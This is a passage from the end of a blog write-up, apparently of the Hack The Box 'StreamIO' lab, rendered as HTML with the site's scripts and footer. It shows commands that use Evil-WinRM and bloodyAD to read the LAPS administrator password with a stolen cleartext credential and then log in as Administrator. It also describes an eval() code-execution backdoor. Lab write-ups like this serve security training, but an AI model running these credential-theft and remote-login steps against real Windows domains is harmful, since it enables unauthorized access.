+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">nikk37</span><span class="p">&gt;</span> <span class="nb">Get-AdComputer</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Properties</span> <span class="nb">ms-Mcs</span><span class="n">-AdmPwd</span> <span class="n">-Credential</span> <span class="nv">$cred</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">DistinguishedName</span> <span class="err">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">DC</span><span class="p">,</span><span class="n">OU</span><span class="p">=</span><span class="n">Domain</span> <span class="n">Controllers</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">streamIO</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">DNSHostName</span>       <span class="err">:</span> <span class="n">DC</span><span class="p">.</span><span class="py">streamIO</span><span class="p">.</span><span class="py">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">Enabled</span>           <span class="err">:</span> <span class="n">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">Name</span>              <span class="err">:</span> <span class="n">DC</span>
+</span></span><span class="line"><span class="cl"><span class="n">ObjectClass</span>       <span class="err">:</span> <span class="n">computer</span>
+</span></span><span class="line"><span class="cl"><span class="n">ObjectGUID</span>        <span class="err">:</span> <span class="n">8c0f9a80-aaab</span><span class="p">-</span><span class="n">4a78</span><span class="p">-</span><span class="mf">9e0d</span><span class="p">-</span><span class="n">7a4158d8b9ee</span>
+</span></span><span class="line"><span class="cl"><span class="n">SamAccountName</span>    <span class="err">:</span> <span class="n">DC</span><span class="p">$</span>
+</span></span><span class="line"><span class="cl"><span class="n">SID</span>               <span class="err">:</span> <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">1470860369</span><span class="p">-</span><span class="mf">1569627196</span><span class="p">-</span><span class="mf">4264678630</span><span class="p">-</span><span class="mf">1000</span>
+</span></span><span class="line"><span class="cl"><span class="n">UserPrincipalName</span> <span class="err">:</span>
+</span></span></code></pre></div><p>The attribute just doesn&rsquo;t show. bloodyAD worked fine:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ❯ bloodyAD --host 10.129.11.215 -d streamIO.htb -u JDgodd -p <span class="s1">&#39;JDg0dd1s@d0p3cr3@t0r&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  get search --filter <span class="s1">&#39;(ms-mcs-admpwdexpirationtime=*)&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">CN</span><span class="o">=</span>DC,OU<span class="o">=</span>Domain Controllers,DC<span class="o">=</span>streamIO,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">ms-Mcs-AdmPwd: 7x/<span class="o">}</span><span class="c1">#R.9&amp;hczaZ</span>
+</span></span><span class="line"><span class="cl">ms-Mcs-AdmPwdExpirationTime: <span class="m">134250236444854828</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i 10.129.11.215 -u Administrator -p <span class="s1">&#39;7x/}#R.9&amp;hczaZ&#39;</span>
+</span></span></code></pre></div><p>Root flag was on Martin&rsquo;s desktop, not Administrator&rsquo;s. Checked <code>C:\Users\Martin\Desktop\</code> for it. The eval() backdoor is what made this box memorable for me. A developer left a <code>file_get_contents</code> feeding directly into <code>eval</code> in a debug parameter that nobody thought to remove from production. One authenticated request to a hidden parameter and you have arbitrary PHP execution. Clean chain, unusually web-heavy for an AD box.</p>
+
+            </div>
+        </article></main>
+</div>
+
+<script>
+    function toggleToc() {
+        const content = document.getElementById('tocContent');
+        const button = document.querySelector('.toc-toggle');
+        if (!content || !button) return;
+        content.classList.toggle('expanded');
+        button.classList.toggle('expanded');
+    }
+
+    function toggleMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        if (miniToc) miniToc.classList.toggle('minimized');
+    }
+
+    function setupActiveHighlighting(links) {
+        const targets = Array.from(links).map(link => {
+            const href = link.getAttribute('href');
+            if (href && href.startsWith('#')) {
+                const el = document.getElementById(decodeURIComponent(href.slice(1)));
+                if (el) return { link, element: el };
+            }
+            return null;
+        }).filter(Boolean);
+
+        if (targets.length === 0) return;
+
+        function update() {
+            const scrollPosition = window.scrollY + 100;
+            let active = null;
+            targets.forEach(t => {
+                if (t.element.offsetTop <= scrollPosition) active = t;
+            });
+            links.forEach(l => l.classList.remove('active'));
+            if (active) active.link.classList.add('active');
+        }
+
+        let ticking = false;
+        window.addEventListener('scroll', () => {
+            if (!ticking) {
+                requestAnimationFrame(() => { update(); ticking = false; });
+                ticking = true;
+            }
+        });
+        update();
+    }
+
+    function initMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        const miniTocContent = document.getElementById('miniTocContent');
+        const sourceToc = document.getElementById('tocContent');
+        if (!miniToc || !miniTocContent || !sourceToc) return;
+
+        const clone = sourceToc.cloneNode(true);
+        clone.classList.remove('toc-content', 'expanded');
+        clone.removeAttribute('id');
+
+        const links = clone.querySelectorAll('a');
+        if (links.length === 0) return;
+
+        links.forEach(link => {
+            link.addEventListener('click', (e) => {
+                const href = link.getAttribute('href');
+                if (href && href.startsWith('#')) {
+                    const target = document.getElementById(decodeURIComponent(href.slice(1)));
+                    if (target) {
+                        e.preventDefault();
+                        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                        history.pushState(null, '', href);
+                    }
+                }
+            });
+        });
+
+        miniTocContent.appendChild(clone);
+        miniToc.classList.add('visible');
+        setupActiveHighlighting(links);
+    }
+
+    document.addEventListener('DOMContentLoaded', initMiniToc);
+</script>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://discord.com/users/kanyo._" target="_blank" rel="noopener noreferrer me"
+    title="Discord"><svg xmlns="http://www.w3.org/2000/svg" viewBox="20 15 205 190" fill="currentColor" stroke="none">
+    <path
+        d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z" />
+    <path
+        d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z" />
+</svg></a>
+<a href="https://github.com/Chaelsoo" target="_blank" rel="noopener noreferrer me"
+    title="Github"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg></a>
+<a href="https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/" target="_blank" rel="noopener noreferrer me"
+    title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg></a>
+<a href="https://app.hackthebox.com/users/1490281" target="_blank" rel="noopener noreferrer me"
+    title="Hackthebox"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1L2 6.5v11L12 23l10-5.5v-11L12 1z"></path><path d="M12 12L2 6.5M12 12v11M12 12l10-5.5"></path></svg></a>
+</div>
+    <small class="footer_copyright">
+        © 2026 .
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+
+
+
+
+    
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js"></script>
+
+    
+
+</body>
+</html>
